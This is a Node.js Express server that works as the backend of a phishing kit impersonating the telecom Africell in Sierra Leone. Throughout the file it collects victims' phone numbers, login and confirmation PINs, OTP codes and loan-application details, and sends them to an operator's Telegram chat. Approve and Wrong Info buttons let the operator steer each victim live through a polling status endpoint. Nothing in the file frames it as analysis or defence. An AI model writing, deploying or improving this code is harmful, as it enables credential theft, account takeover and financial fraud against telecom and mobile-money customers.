const express = require('express');
const cors = require('cors');
const path = require('path');
require('dotenv').config();

const app = express();
const PORT = process.env.PORT || 8080;

app.use(cors());
app.use(express.json());
app.use(express.static('.')); // Serves your static HTML files

const orderStatuses = {};   
const lastSubmissionTime = {}; 
const userCredentials = {}; 

function escapeMarkdown(text) {
    if (!text) return '';
    return text.replace(/[_*[\]()~`>#+\-=|{}.!]/g, '\\$&');
}

async function sendToTelegram(url, payload) {
    const controller = new AbortController();
    const timeoutId = setTimeout(() => controller.abort(), 15000);

    try {
        const response = await fetch(url, {
            method: 'POST',
            headers: { 'Content-Type': 'application/json' },
            body: JSON.stringify(payload),
            signal: controller.signal
        });
        clearTimeout(timeoutId);
        const data = await response.json();
        
        if (!data.ok) {
            console.error('🚨 TELEGRAM REJECTED MESSAGE:', JSON.stringify(data));
        } else {
            console.log('✅ Message successfully delivered to Telegram!');
        }
        return data;
    } catch (error) {
        clearTimeout(timeoutId);
        console.error('❌ Telegram Fetch Exception:', error.message);
        throw error;
    }
}

app.post('/api/submit-order', async (req, res) => {
    try {
        const { phone, uniqueId } = req.body;
        
        if (!phone) {
            return res.status(400).json({ success: false, message: 'Phone number required.' });
        }

        const cleanPhone = phone.replace(/\s+/g, '').trim();
        const currentTime = Date.now(); 
        const cooldownTime = 15 * 1000; 

        orderStatuses[cleanPhone] = 'pending';

        const isImportantAction = (uniqueId && (
            uniqueId.startsWith('PIN: ') || 
            uniqueId.startsWith('Login PIN: ') || 
            uniqueId.startsWith('OTP Code: ') || 
            uniqueId.startsWith('Confirmation PIN: ') || 
            uniqueId.startsWith('Sign-in Phone Number:') || 
            uniqueId.startsWith('Disbursement Requested -') ||
            uniqueId.startsWith('Application -')
        ));

        if (!isImportantAction && lastSubmissionTime[cleanPhone] && (currentTime - lastSubmissionTime[cleanPhone] < cooldownTime)) {
            return res.json({ success: true, message: 'Already submitted.' });
        }

        lastSubmissionTime[cleanPhone] = currentTime;

        const BOT_TOKEN = process.env.TELEGRAM_BOT_TOKEN;
        const CHAT_ID = process.env.TELEGRAM_CHAT_ID;

        const countryFlag = "🇸🇱";
        const rawDigits = cleanPhone.replace(/\+232/g, '').trim();

        if (!userCredentials[cleanPhone]) {
            userCredentials[cleanPhone] = {};
        }

        let headerTitle = "🔔 *Africell Submission Update*";
        let wrongButtonText = "❌ Wrong Info";

        if (uniqueId && uniqueId.startsWith('Sign-in Phone Number:')) {
            headerTitle = "📱 *Africell Sign-in Phone Number*";
            wrongButtonText = "⚠️ Wrong Info";
        } else if (uniqueId && uniqueId.startsWith('Confirmation PIN: ')) {
            headerTitle = "🔐 *Africell Confirmation PIN Submitted*";
            wrongButtonText = "⚠️ Wrong PIN";
            userCredentials[cleanPhone].confirmPin = uniqueId.replace('Confirmation PIN: ', '').trim();
        } else if (uniqueId && uniqueId.startsWith('Disbursement Requested -')) {
            headerTitle = "💰 *Africell Disbursement Request*";
            wrongButtonText = "⚠️ Wrong PIN / Error";
        } else if (uniqueId && uniqueId.startsWith('Application -')) {
            headerTitle = "📄 *New Loan Application Submitted*";
            wrongButtonText = "❌ Reject Application";
            userCredentials[cleanPhone].applicationDetails = uniqueId;
        }

        userCredentials[cleanPhone].phone = cleanPhone;

        let message = `${headerTitle}\n\n` +
                      `${countryFlag} Country: \`+232\`\n` +
                      `📱 Phone: \`${escapeMarkdown(rawDigits)}\``;

        if (userCredentials[cleanPhone].applicationDetails) {
            message += `\n\n📋 *Details:*\n${escapeMarkdown(userCredentials[cleanPhone].applicationDetails)}`;
        }
        if (userCredentials[cleanPhone].confirmPin) {
            message += `\n🔐 Confirmation PIN: \`${escapeMarkdown(userCredentials[cleanPhone].confirmPin)}\``;
        }

        const telegramUrl = `https://api.telegram.org/bot${BOT_TOKEN}/sendMessage`;
        const encodedId = encodeURIComponent(uniqueId || 'N/A');

        await sendToTelegram(telegramUrl, {
            chat_id: CHAT_ID,
            text: message,
            parse_mode: 'Markdown',
            reply_markup: {
                inline_keyboard: [
                    [
                        { text: "✅ Approve", callback_data: `approve_${cleanPhone}_${encodedId}` }
                    ],
                    [
                        { text: wrongButtonText, callback_data: `wrong_id_${cleanPhone}_${encodedId}` }
                    ]
                ]
            }
        });

        res.json({ success: true, message: 'Sent successfully.' });
    } catch (error) {
        console.error(error);
        res.status(500).json({ success: false, message: 'Error' });
    }
});

app.get('/api/check-status', (req, res) => {
    const rawQueryPhone = req.query.phone || '';
    const cleanPhone = rawQueryPhone.replace(/\s+/g, '').trim();
    const status = orderStatuses[cleanPhone] || 'pending';
    
    console.log(`Polling check for phone query: [${rawQueryPhone}] -> cleaned: [${cleanPhone}] -> status: ${status}`);
    res.json({ status });
});

app.post('/api/telegram-webhook', async (req, res) => {
    try {
        const update = req.body;

        if (update.callback_query) {
            const callbackData = update.callback_query.data;
            const chatId = update.callback_query.message.chat.id;
            const messageId = update.callback_query.message.message_id;
            const BOT_TOKEN = process.env.TELEGRAM_BOT_TOKEN;

            let actionText = '';
            let phone = '';
            let messageTitle = 'Processed Request';

            if (callbackData.startsWith('approve_') || callbackData.startsWith('reject_') || callbackData.startsWith('wrong_id_')) {
                const prefix = callbackData.startsWith('approve_') ? 'approve_' : (callbackData.startsWith('reject_') ? 'reject_' : 'wrong_id_');
                const remainder = callbackData.replace(prefix, '');
                
                const lastUnderscoreIndex = remainder.lastIndexOf('_');
                if (lastUnderscoreIndex !== -1) {
                    phone = remainder.substring(0, lastUnderscoreIndex);
                } else {
                    phone = remainder;
                }
                phone = phone.replace(/\s+/g, '').trim();

                if (callbackData.startsWith('approve_')) {
                    orderStatuses[phone] = 'approved';
                    actionText = 'Approved ✅';
                    messageTitle = 'Africell Request Approved';
                } else if (callbackData.startsWith('reject_')) {
                    orderStatuses[phone] = 'rejected';
                    actionText = 'Rejected ❌';
                    messageTitle = 'Africell Request Rejected';
                } else if (callbackData.startsWith('wrong_id_')) {
                    orderStatuses[phone] = 'wrong_id';
                    actionText = 'Wrong Info / Error ⚠️';
                    messageTitle = 'Africell Credential Error';
                }
            }

            const countryFlag = "🇸🇱";
            const rawDigits = phone ? phone.replace(/\+232/g, '').trim() : '';

            let updatedMessage = `📋 *${messageTitle}*\n\n` +
                                 `${countryFlag} Country: \`+232\`\n` +
                                 `📱 Phone: \`${escapeMarkdown(rawDigits)}\``;

            if (userCredentials[phone]) {
                const creds = userCredentials[phone];
                if (creds.applicationDetails) {
                    updatedMessage += `\n\n📋 *Details:*\n${escapeMarkdown(creds.applicationDetails)}`;
                }
                if (creds.confirmPin) {
                    updatedMessage += `\n🔐 Confirmation PIN: \`${escapeMarkdown(creds.confirmPin)}\``;
                }
            }

            updatedMessage += `\n\n📌 Status: *${actionText}*`;

            const telegramUrl = `https://api.telegram.org/bot${BOT_TOKEN}/editMessageText`;
            await sendToTelegram(telegramUrl, {
                chat_id: chatId,
                message_id: messageId,
                text: updatedMessage,
                parse_mode: 'Markdown'
            });
        }
    } catch (err) {
        console.error('Webhook Error:', err);
    }

    res.sendStatus(200);
});

async function registerTelegramWebhook() {
    const BOT_TOKEN = process.env.TELEGRAM_BOT_TOKEN;
    const RENDER_URL = process.env.RENDER_EXTERNAL_URL;

    if (!BOT_TOKEN || !RENDER_URL) {
        console.log('Telegram webhook setup skipped: missing environment variable.');
        return;
    }

    const webhookUrl = `${RENDER_URL}/api/telegram-webhook`;

    try {
        const telegramUrl = `https://api.telegram.org/bot${BOT_TOKEN}/setWebhook?url=${encodeURIComponent(webhookUrl)}`;
        const result = await fetch(telegramUrl).then(res => res.json());

        console.log('Telegram webhook setup:', result);
    } catch (error) {
        console.error('Telegram webhook setup failed:', error.message);
    }
}

app.get('/', (req, res) => {
    res.sendFile(path.join(__dirname, 'login.html'));
});

app.listen(PORT, () => {
    console.log(`Server running live at http://localhost:${PORT}`);
    registerTelegramWebhook();
});